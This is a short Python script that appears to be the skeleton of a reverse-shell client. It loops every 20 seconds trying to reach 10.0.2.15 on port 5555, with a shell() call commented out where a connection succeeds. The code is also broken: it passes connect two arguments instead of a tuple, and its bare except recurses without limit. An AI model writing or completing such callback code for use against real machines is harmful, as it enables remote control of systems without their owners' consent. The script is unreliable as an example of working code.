import socket
import time


def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect("10.0.2.15", 5555)
            # shell()
            sock.close()
            break
        except:
            connection()


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()
